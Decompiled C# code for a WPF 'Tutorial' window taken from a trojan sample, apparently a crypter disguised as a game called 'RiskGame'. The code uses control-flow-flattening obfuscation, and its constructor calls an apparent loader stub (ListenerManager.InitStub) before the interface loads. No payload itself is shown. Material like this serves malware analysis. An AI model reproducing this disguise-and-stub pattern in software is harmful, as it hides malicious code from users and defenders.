// Decompiled with JetBrains decompiler
// Type: RiskGame.Windows.Tutorial
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Structs;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Markup;

namespace RiskGame.Windows
{
  public class Tutorial : Window, IComponentConnector
  {
    private bool @event;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Tutorial()
    {
      int num1 = 4;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 4:
            ListenerManager.InitStub();
            num2 = 3;
            break;
          case 1:
          case 3:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            goto case 2;
          case 2:
            this.InitializeComponent();
            num2 = 5;
            break;
          case 5:
            goto label_7;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
      }
label_7:;
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num = 1;
      Uri resourceLocator;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            flag = this.@event;
            num = 3;
            continue;
          case 2:
          case 4:
            resourceLocator = new Uri("/IEnumUnkn;component/tutorial.xaml", UriKind.Relative);
            goto case 5;
          case 3:
            if (!flag)
            {
              this.@event = true;
              if (!Tutorial.ResolveObject())
              {
                num = 4;
                continue;
              }
              goto label_8;
            }
            else
              goto label_9;
          case 5:
            Application.LoadComponent((object) this, resourceLocator);
            num = 6;
            continue;
          case 6:
            goto label_8;
          default:
            num = 5;
            continue;
        }
      }
label_9:
      return;
label_8:;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int firstcounter, object visitor) => this.@event = true;

    internal static bool NewObject() => true;

    internal static bool ResolveObject() => false;
  }
}
